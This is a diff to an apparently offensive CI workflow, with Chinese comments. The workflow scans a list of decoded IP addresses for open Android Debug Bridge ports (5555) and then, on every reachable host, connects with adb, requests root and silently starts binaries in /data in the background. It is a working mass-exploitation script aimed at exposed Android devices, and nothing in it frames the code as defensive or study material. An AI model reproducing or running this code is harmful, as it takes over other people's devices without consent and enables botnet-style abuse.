@@ -32,8 +32,13 @@ jobs:
           echo "$DECODED_IP" >> decoded_ips.txt
         done < 1.txt
 
-    - name: Test ports and run ADB commands
+    - name: Collect reachable IPs
+      id: collect_ips
       run: |
+        # 临时文件存储可用的 IP
+        REACHABLE_IPS="reachable_ips.txt"
+        touch $REACHABLE_IPS
+        
         # 逐行读取解码后的 IP 并测试端口连通性
         while IFS= read -r ip; do
           echo "Testing IP: $ip"
@@ -46,17 +51,29 @@ jobs:
 
             # 测试5555端口连通性
             if timeout 5 bash -c "echo > /dev/tcp/$ip/5555" 2>/dev/null; then
-              echo "$ip:5555 is open, connecting via ADB..."
-              
-              # 使用 ADB 连接，并运行命令
-              adb connect "$ip:5555"
-              adb root
-              adb -s "$ip:5555" shell 'sh -c "/data/v2 run > /dev/null 2> /data/error.log &"'
-              adb -s "$ip:5555" shell 'sh -c "/data/usb22 -c /data/logfile > /dev/null 2> /data/error.log &"'
-              adb disconnect "$ip:5555"
-              echo "Commands executed on $ip:5555"
+              echo "$ip:5555 is open, adding to reachable IPs."
+              echo "$ip" >> $REACHABLE_IPS
             else
               echo "$ip:5555 is not reachable within 5 seconds, skipping."
             fi
           fi
         done < decoded_ips.txt
+        
+        # 输出所有收集到的 IP
+        echo "Collected reachable IPs:"
+        cat $REACHABLE_IPS
+
+    - name: Test ports and run ADB commands
+      run: |
+        # 逐行读取可用的 IP 并运行 ADB 命令
+        while IFS= read -r ip; do
+          echo "Connecting to IP: $ip"
+          
+          # 使用 ADB 连接，并运行命令
+          adb connect "$ip:5555"
+          adb root
+          adb -s "$ip:5555" shell 'sh -c "/data/v2 run > /dev/null 2> /data/error.log &"'
+          adb -s "$ip:5555" shell 'sh -c "/data/usb22 -c /data/logfile > /dev/null 2> /data/error.log &"'
+          adb disconnect "$ip:5555"
+          echo "Commands executed on $ip:5555"
+        done < reachable_ips.txt
